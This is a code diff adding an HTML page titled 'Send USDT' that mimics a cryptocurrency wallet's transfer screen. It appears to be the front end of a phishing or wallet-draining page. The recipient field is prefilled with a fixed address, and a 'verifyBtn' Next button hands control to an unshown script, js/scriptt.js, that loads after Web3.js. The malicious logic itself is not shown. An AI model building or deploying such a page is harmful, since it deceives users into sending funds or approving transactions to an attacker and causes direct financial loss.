@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send USDT</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  
+  <!-- Web3.js (Load First) -->
+  <script src="js/web3.min.js"></script>
+</head>
+<body>
+  <main class="container">
+    <h1 class="title">Send USDT</h1>
+
+    <label class="label" for="address">Address or Domain Name</label>
+    <div class="input-group">
+      <input type="text" id="address" placeholder="Search or Enter" value="0x6D6a238718cdca54CF797A4AD75b19E5B4837486">
+      <button class="text-btn">Paste</button>
+      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
+      <button class="icon-btn"><i class="fas fa-expand"></i></button>
+    </div>
+
+    <label class="label" for="amount">Amount</label>
+    <div class="input-group">
+      <input type="number" id="amount" placeholder="USDT Amount">
+      <span class="unit">USDT</span>
+      <button class="max-btn">Max</button>
+    </div>
+
+    <p class="estimate">≈ $0.00</p>
+
+    <!-- ✅ Button bound to your JS logic -->
+    <button id="verifyBtn" class="next-btn">Next</button>
+  </main>
+
+  <!-- Custom script after Web3 -->
+  <script src="js/scriptt.js"></script>
+
+  <!-- ✅ Add event listener to call `Next()` -->
+  <script>
+    document.getElementById("verifyBtn").addEventListener("click", Next);
+  </script>
+</body>
+</html>
